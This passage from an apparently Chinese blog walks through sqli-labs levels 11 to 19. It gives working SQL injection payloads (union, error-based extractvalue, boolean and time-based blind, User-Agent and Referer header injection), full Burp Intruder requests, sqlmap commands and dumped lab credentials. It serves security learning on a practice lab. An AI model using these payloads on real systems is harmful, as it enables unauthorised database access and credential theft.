Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆表 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure>\n<p>爆字段:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆字段值:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure>\n<p>后面的都是常规操作了</p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>sqlmap 测 post 请求可以用参数 forms，直接获取表单，可以使用 - r 参数读取请求文件，或者通过–data 参数测试，具体情况具体百度</p>\n<p>-r 读取的文件可以用 bp 抓包，右键 copy to file，直接导出 txt 文件</p>\n<hr>\n<h1 id=\"less-12\"><a class=\"markdownIt-Anchor\" href=\"#less-12\">#</a> Less-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>date：2020-11-21 17:21:22</p>\n<h3 id=\"sqlmap-12\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-12\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-12\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-12\">#</a> 手工注入</h3>\n<p>上 bp 抓包</p>\n<p>发现双引号报错，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>我？？？</p>\n<p>生气的乱搞了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>这下出来了把，后面是 &quot;)，再加个括号闭合一下下，分别 order by2 和 3，确定是两个字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出当前数据库～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作参考 less-11</p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>和上一关比就是单引号闭合变成 &quot;) 闭合了，和前面十关做的题目一样呀，后面不会还是一样的吧，然后写完盲注就没了把</p>\n<p>唉，我觉得我的专注力有点不太够，才写了几道题啊，还花了这么长时间，真是废物</p>\n<hr>\n<h1 id=\"less-13\"><a class=\"markdownIt-Anchor\" href=\"#less-13\">#</a> Less-13</h1>\n<p>date：2020-11-21 18:08:01</p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<h3 id=\"sqlmap-13\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-13\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-13\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-13\">#</a> 手工注入</h3>\n<p>盲猜这题是 ')) 闭合，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哦豁，是 ') 闭合，生气！闭合：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出只有一张图片，表示闭合成功，没有数据回显</p>\n<p>那就用报错来看数据呗，正好报错注入的函数我用的少</p>\n<p>extractvalue (目标 xml 文档，xml 路径) 用于查询 xml 文件</p>\n<p>第二个参数 xml 中的位置是可操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx/… 这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出得到当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure>\n<p>拿别的数据在 xml 路径那里改 payload 即可，参考 less-11</p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p><a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">十种 sql 报错注入姿势总结</a></p>\n<hr>\n<h1 id=\"less-14\"><a class=\"markdownIt-Anchor\" href=\"#less-14\">#</a> Less-14</h1>\n<p>date：2020-11-21 19:47:21</p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<h3 id=\"sqlmap-14\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-14\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-14\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-14\">#</a> 手工注入</h3>\n<p>直接双引号闭合了，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>能闭合了就随便用之前的哪个方法拿数据都可以啦，用报错注入拿个数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>别的同 Less-11</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p>这，没啥</p>\n<hr>\n<h1 id=\"less-15\"><a class=\"markdownIt-Anchor\" href=\"#less-15\">#</a> Less-15</h1>\n<p>date：2020-11-21 20:03:27</p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<h3 id=\"sqlmap-15\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-15\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-15\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-15\">#</a> 手工注入</h3>\n<p>看标题，布尔盲注，行叭，上 bp 抓包</p>\n<p>单引号闭合后接 order by 2，给的是 flag.jpg</p>\n<p>接 order by 2，给的是 slap.jpg</p>\n<p>明显 flag.jpg 的就是登陆成功嘛</p>\n<p>说明单引号闭合成功且需要的是两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>还是先利用 if 判断，把数据库名字长度搞出来，利用一下 payload，服务器沉睡了好一会才醒来，那么长度就是 8 啦！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>一个一个字符猜，这种搬砖的活还是交给 bp 把</p>\n<p>右键 send to Intruder，attack type 选 cluster bomb:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),§1§,1))=§8§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<hr>\n<h1 id=\"less-16\"><a class=\"markdownIt-Anchor\" href=\"#less-16\">#</a> Less-16</h1>\n<p>date：2020-11-21 22:33:47</p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<h3 id=\"sqlmap-16\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-16\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-16\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-16\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin&quot;) or 1=1 -- </code> 直接登录成功，不要忘记–后面的空格哈</p>\n<p>因为可以根据图片的显示判断，所以其实时间盲注还是布尔盲注都是可以的呀，只是前面那道题用过布尔盲注了，这里就用时间盲注</p>\n<p>老规矩先判断数据库长度是 8：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure>\n<p>然后搬砖找 bp，send to Intruder：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),§1§,1))=§8§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>bp 真好，sqlmap 真好，搬砖真难</p>\n<hr>\n<h1 id=\"less-17sqlmaping\"><a class=\"markdownIt-Anchor\" href=\"#less-17sqlmaping\">#</a> Less-17（sqlmaping）</h1>\n<p>date：2020-11-21 22:54:56</p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看见题目又开心了起来，不是盲注啦</p>\n<h3 id=\"sqlmap-17\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-17\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 17.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-17\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-17\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin' or 1=1 -- </code></p>\n<p>竟然返回 bug off，you silly dump hacker</p>\n<p>哦豁，骂我，我要干你，等着</p>\n<p>我怀疑后台判断了用户输入，然后无数次尝试无数次被骂，我决定偷偷看一下源码</p>\n<p>源码中对 uname 限制了只能 15 个字符，单是这个就已经很无力了，后来看完源码才发现这是一个重置密码的表单，而且源码中并没有对 passwd 做限制</p>\n<p>眼瞎的我决定用时间盲注，bp send to repeater：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>哈哈 服务器睡着啦，随后时间盲注就可以了，和上面的题目一样</p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>感觉用得多的还是盲注</p>\n<p>盲注手工注入最快就是用二分法，但是我是有 bp 的人！</p>\n<ol>\n<li>–risk=RISK 风险（1-4，默认 1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试；risk 3：or 语句的测试；risk 4：update 的测试</li>\n</ol>\n<hr>\n<h1 id=\"less-18\"><a class=\"markdownIt-Anchor\" href=\"#less-18\">#</a> Less-18</h1>\n<p>date：2020-11-22 00:19:07</p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>题目提示，Your IP ADDRESS is: 127.0.0.1，这题我会！肯定是 xff 头注入！（结果不是）</p>\n<h3 id=\"sqlmap-18\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-18\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 18.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-18\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-18\">#</a> 手工注入</h3>\n<p>既然不是 xff 头，那就看一下源码把</p>\n<p>源码中对账户密码进行了判断，必须要绕过去才能进行头注入，刚好上一题重置了密码</p>\n<p>那么就输入相应的账户密码，再在 user-agent 上注入就好啦，先来个单引号报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>讲道理这里肯定是插入操作，那就是 insert 注入咯，源码确实是 insert，其实不管是什么注入，只要能大概弄 sql 语句，顺利让数据库执行我们的代码即可</p>\n<p>拿 database () 这里利用报错注入，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，拿到当前数据库 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值同 less-11，改一下 payload 即可</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>看源码，就像考试作弊，心怀愧疚～～（跃跃欲试）~~</p>\n<ol>\n<li>level 参数：</li>\n</ol>\n<blockquote>\n<p>1 &gt; 探测等级： --level 5</p>\n<p>–level 5 指的是需要执行的测试等级</p>\n<p>一共有 5 个等级（1-5） 不加 level 时，默认是 1</p>\n<p>5 级包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>在不能确定哪个 payload 或参数为注入点时，建议使用高的 level 值。</p>\n</blockquote>\n<hr>\n<h1 id=\"less-19\"><a class=\"markdownIt-Anchor\" href=\"#less-19\">#</a> Less-19</h1>\n<p>date：2020-11-22 10:01:30</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<h3 id=\"sqlmap-19\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-19\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 19.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-19\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-19\">#</a> 手工注入</h3>\n<p>看标题，referer 注入，看来后面的题目都是头注入了</p>\n<p>打开 hackbar，点击 post data，输入正确的用户名密码，提示我的 referer 是啥啥啥，再次确定就是 referer 头注入</p>\n<p>不知道为啥 hackbar 同时搞 postdata 和 referer，referer 没有起作用，上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: 